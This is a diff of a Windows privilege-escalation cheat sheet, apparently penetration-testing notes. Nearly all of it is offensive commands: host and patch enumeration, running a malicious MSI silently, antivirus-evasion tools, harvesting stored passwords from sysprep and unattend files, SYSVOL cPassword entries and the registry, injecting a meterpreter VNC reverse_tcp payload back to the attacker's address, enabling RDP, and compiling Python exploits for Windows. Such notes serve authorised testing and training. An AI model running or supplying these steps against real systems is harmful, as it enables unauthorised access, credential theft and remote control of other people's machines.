@@ -1,4 +1,6 @@
-### INFORMATION GATHERING
+#########################
+# INFORMATION GATHERING #
+#########################
 
  What system are we connected to? 
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
@@ -35,7 +37,7 @@ python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt
 --> Run windows-privesc script 
 https://github.com/pentestmonkey/windows-privesc-check
 
-### WMIC
+# WMIC
 
 Windows Management Instrumentation Command Line 
 Windows XP requires admin 
@@ -58,14 +60,11 @@ Windows Vista/2008 6.1.6000 x32,Windows Vista/2008 6.1.6001 x32,Windows 7 6.2.76
 wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2393802"
 
 
-Find writeable files
+# Find writeable files
 dir /a-r-d /s /b
 /a is to search for attributes. In this case r is read only and d is directory. The minus signs negate those attributes. So we're looking for writable files only.
 /s means recurse subdirectories
 /b means bare format. Path and filename only.
-
-
-
 
 
 
@@ -135,22 +134,27 @@ Then use msiexec on victim to execute your msi:
 msiexec /quiet /qn /i C:\evil.msi
 
 
-
-
 # Bypassing AV
-Use Veil-Evasion
+- Veil-Evasion
 Create your own executable by “compiling” PowerShell scripts
 Use Metasploit to substitute custom EXE and MSI binaries. You can set EXE::Custom or MSI::Custom to point to your binary prior to executing the module.
 
+- Service executable in C#
+https://trustfoundry.net/practical-guide-to-exploiting-the-unquoted-service-path-vulnerability-in-windows/
+https://github.com/mattymcfatty/unquotedPoC/blob/master/SimpleService.Designer.cs
 
-### STORED CREDENTIALS
-Directories that contain the configuration files (however better check the entire filesystem). These files either contain clear-text passwords or in a Base64 encoded format.
+
+######################
+# STORED CREDENTIALS #
+######################
+
+Directories that contain the configuration files. These files either contain clear-text passwords or in a Base64 encoded format.
 C:\sysprep.inf
 C:\sysprep\sysprep.xml
 %WINDIR%\Panther\Unattend\Unattended.xml
 %WINDIR%\Panther\Unattended.xml 
-When the box is connected to a Domain:
-Look for Groups.xml in SYSVOL 
+
+When the box is connected to a Domain, look for Groups.xml in SYSVOL 
 GPO preferences can be used to create local users on domain. So passwords might be stored there. Any authenticated user will have read access to this file. The passwords is encryptes with AES. But the static key is published on the msdn website. Thus it can be decrypted.
 Search for other policy preference files that can have the optional “cPassword” attribute set:
 Services\Services.xml: Element-Specific Attributes
@@ -197,8 +201,10 @@ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
 reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
 
 
+###############
+# Getting GUI #
+###############
 
-# Getting GUI
 --> Using meterpreter, inject vnc session: 
 run post/windows/manage/payload_inject payload=windows/vncinject/reverse_tcp lhost=<yourip> options=viewonly=false
 --> Enable RDP: 
@@ -224,7 +230,10 @@ OR (meterpreter)
 run post/windows/manage/enable_rdp
 https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/ 
 
-# Python exploits
+###################
+# Python exploits #
+###################
+
 Compiling Python Exploits for Windows on Linux 
 install pyinstaller of windows with wine on Kali and then
 wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile 18176.py
